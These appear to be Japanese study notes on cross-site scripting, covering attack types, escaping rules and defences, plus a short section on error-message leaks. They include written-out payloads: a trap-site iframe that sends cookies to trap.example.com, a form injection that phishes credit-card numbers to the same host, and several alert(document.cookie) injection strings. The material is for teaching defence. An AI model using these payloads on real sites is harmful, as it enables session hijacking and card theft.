## クロスサイト・スクリプティング(基本編)

### 概要

- 外部からの入力などに応じて表示が変化する箇所にて、HTML生成の実装に問題があると、クロスサイト・スクリプティング(XSS)という脆弱性が生じる
- 被害例
    - サイト利用者のブラウザで攻撃者が用意したスクリプトの実行によりクッキー値を盗まれ、成りすましの被害に遭う。あるいはサイト利用者の権限でアプリケーションの機能を悪用される

### 攻撃手法と影響

#### XSSによるクッキー値の盗み出し

- Ex. 罠サイト
    
    ```html
    <body>
    激安商品情報
    <br><br>
    <iframe width="320" height="100"
    	src="http://example.jp/43/43-001.php?keyword=&lt;script&gt;
    	window.location='http://trap.example.com/43/43-901.php
    		?sid='%2Bdocument.cookie;&lt;/script&gt;"></iframe>
    
    </body>
    ```
    
    - iframe要素のなかに脆弱性サイトのページを表示してXSS攻撃を仕掛ける
        1. 罠サイトのiframe内で脆弱性サイトを表示
        2. XSS攻撃によりクエリパラメーターにクッキー値をつけて情報収集ページに遷移
        3. 収集ページにて受け取ったクッキー値をメールで攻撃者に送信する

#### 画面の書き換え

- 脆弱性のあるサイト
    
    ```html
    <body>
    <form action="" method="POST">
    氏　　名<input size="20" name="name" value=""><br>
    住　　所<input size="20" name="addr" value=""><br>
    電話番号<input size="20" name="tel" value=""><br>
    品　　目<input size="10" name="kind" value="">
    数量<input size="5" name="num" value=""><br>
    <input type="submit" value="申込"></form>
    	
    </body>
    ```
    
- 攻撃サイト
    
    ```html
    <form action="http://example.jp/43/43-002.php" method="POST">
    <input name="name" type="hidden" value="&quot;&gt;&lt;/form&gt;&lt;form style=top:5px;left:5px;position:absolute;z-index:99;background-color:white action=http://trap.example.com/43/43-903.php method=POST&gt;粗大ゴミの回収費用がクレジットカードでお支払い頂けるようになりました&lt;br&gt;氏　　名&lt;input size=20 name=name&gt;&lt;br&gt;住　　所&lt;input size=20 name=addr&gt;&lt;br&gt;電話番号&lt;input size=20 name=tel&gt;&lt;br&gt;品　　目&lt;input size=10 name=kind&gt;数量&lt;input size=5 name=num&gt;&lt;br&gt;カード番号&lt;input size=16 name=card&gt;有効期限&lt;input size=5 name=thru&gt;&lt;br&gt;&lt;input value=申込 type=submit&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;/form&gt;">
    <input style="cursor:pointer;text-decoration:underline;color:blue;border:none;background:transparent;font-size:100%;" type="submit" value="○○市粗大ゴミ申し込みセンター">
    </form>
    ```
    
    - アンカータグに見せかけた3行目のリンクを押下すると、脆弱性のあるサイトへ遷移
    - 脆弱性のサイト上では</form>によりform要素が終了され、新しいform要素を開始している。このactionには罠のサイトを指定する
    - ブラウザのURL上では正規のものであるため、ページ上で偽物であることを見破る手立てはない

### XSS攻撃の分類

#### 反射型XSS

- 攻撃用JavaScriptが攻撃対象サイトとは別のサイトにある場合を反射型XSSと呼ぶ
- 多くの場合入力値をそのまま表示するページで発生する

#### 持続型XSS

- 攻撃用のJavaScriptが攻撃対象のDBに保存される場合
    - 攻撃者にとって罠サイトに誘導する手間がかからないことと、注意深い利用者でも被害に遭う可能性が高いことが、攻撃者にとってのメリット

### 脆弱性が生まれる原因

- HTMLの文法上特別な意味を持つ特殊記号(メタ文字)を正しく扱っておらず、開発者の意図しない形でHTMLやJavaScriptを注入・変形される現象がXSS
- メタ文字の持つ特別な意味を打ち消し、文字そのものとして扱うために「**エスケープ**」を行うのが重要

#### HTMLエスケープの概要

- HTML上で「`<`」という文字を表示させたい場合は、「`&lt;`」と記述しなければならない
    - → これを怠るとブラウザは「`<`」をタグの開始と解釈する
- HTMLのデータは構文上の場所に応じてエスケープすべきメタ文字も変わる
    
    ```html
    <input name="tel" value="属性値">
    <p>
    要素内容
    </p>
    
    ```
    
- 要素内容であれば、「`<`」と「`&`」を文字参照に
- 属性値であれば、属性値を「`”`」で囲み、「`<`」と「`&`」と「`”`」を文字参照に

#### XSSに対する保険的対策

- X-XSS-Protectionレスポンスヘッダの使用
    - ブラウザにはXSSファイルたという反射型XSSをブラウザが検知し、無害な出力に変更してくれるものがある
        - デフォルトで有効だが、利用者に無効化していることもある
    - X-XSS-Protectionレスポンスヘッダは、利用者によるXSSフィルタ設定を上書きして有効化・無効化を設定することができる。
    - 以下設定することを推奨
        
        ```html
        X-XSS-Protection: 1; mode=block
        ```
        
- クッキーにHttpOnly属性を付与する
    - JavaScriptからのクッキーの読み出しを禁止する

## クロスサイト・スクリプティング(発展編)

### href属性やsrc属性のXSS

- URLを属性値とする属性において、URLを外部から変更できる場合、「javascript:JavaScript構文」という形式(javascriptスキーム)で、JavaScriptを起動できる
    
    ```html
    <a href="javascript:alert(document.cookie)">ブックマーク</a>
    ```
    
    これは実行される
    
- 対策
    - URLとして以下のいずれかの身を許容するようにチェックする
        - http: またはhttps: で始まる絶対URL
        - スラッシュ「/」で始まる相対URL

### イベントハンドラのXSS

- イベントハンドラを動的生成する際のXSS脆弱性
- Ex. init関数の引数をnameクエリパラメーターから受け取る
    - 正常系 `?name=Yamada`
        
        ```html
        <body onload="init('Yamada')"></body>
        ```
        
    - XSS `?name=');alert(document.cookie)//`
        
        ```html
        <body onload="init('');alert(document.cookie)//')">
        ```
        
        - init関数の引数に当たる文字列リテラルが勝手に終了させられ、第二の文が挿入されてしまっている
        - JavaScriptの文字列リテラルのエスケープが抜けていたことが原因
        - JavaScriptの文字列リテラルとして下記はエスケープすべき
            
            
            | 文字 | エスケープ後 |
            | --- | --- |
            | \ | \\ |
            | ' | \’ |
            | “ | \” |
            | 改行 | \n |

### script要素のXSS

- script要素の一部を動的生成する際のXSS脆弱性
- Ex.
    
    ```html
    <script>
      var div = document.getElementById('name');
      
      // クエリパラメーターnameを受け取り、「\」「'」「"」をespaceする処理
      var txt = escape_js($name)
      div.textContent = txt + 'の文字数は' + txt.length + '文字です';
    </script>
    ```
    
    - 正常系 [`http://example.jp/43/43-013.php?name=大谷san`](http://example.jp/43/43-013.php?name=%E5%A4%A7%E8%B0%B7san)
        
        ```html
        大谷sanの文字数は5文字です
        ```
        
    - XSS [`http://example.jp/43/43-013.php?name=</script><script>alert(document.cookie)//`](http://example.jp/43/43-013.php?name=%3C/script%3E%3Cscript%3Ealert(document.cookie)//)
        
        ```html
        セッションIDが表示される
        ```
        
        - `</script>`でscript要素を終わらせることができる。これを悪用して上記XSS攻撃が可能となる

### JavaScript文字列リテラルの動的生成対策

1. JavaScriptの文法から、引用符「”」「’」と「\」や改行をエスケープする
2. イベントハンドラ中の場合は、1の結果を文字参照によりHTMLエスケープにして、ダブルクォーとで囲む
3. script要素ないの場合は、1の結果に「</script>」という文字列が出現しないようにする

<aside>
💡

JavaScriptのエスケープルールは複雑であるため、できれば動的生成をすることは避けた方が良い

</aside>

### HTMLタグやCSSの入力を許す場合の対策

- HTMLタグの入力を許す場合、script要素やイベントハンドラによって開発者が意図しないJavaScriptの実行が可能になる場合がある。同様にCSSのexpressionsという機能によりJavaScriptも起動できる
- 利用者が入力したHTMLを構文解析して、表示して良い要素のみ抽出する方法があるが、HTML構文は複雑であるため、この方式の実装は容易ではない
- HTMLタグやCSSの入力を許可するサイトを開発する場合は、HTML構文解析してくれるライブラリを使用するのが望ましい

## エラーメッセージからの情報漏洩

- エラーメッセージからの情報漏洩は以下2種類
    - エラーメッセージに攻撃者にとって有益なアプリケーションの内部情報が含まれる
    - 意図的な攻撃として、エラーメッセージに秘密情報を表示させられる
- アプリケーションでエラーが発生した場合、画面に表示するのは利用者向けのメッセージにとどめ、エラーの詳細内容はエラーログに出力するようにする
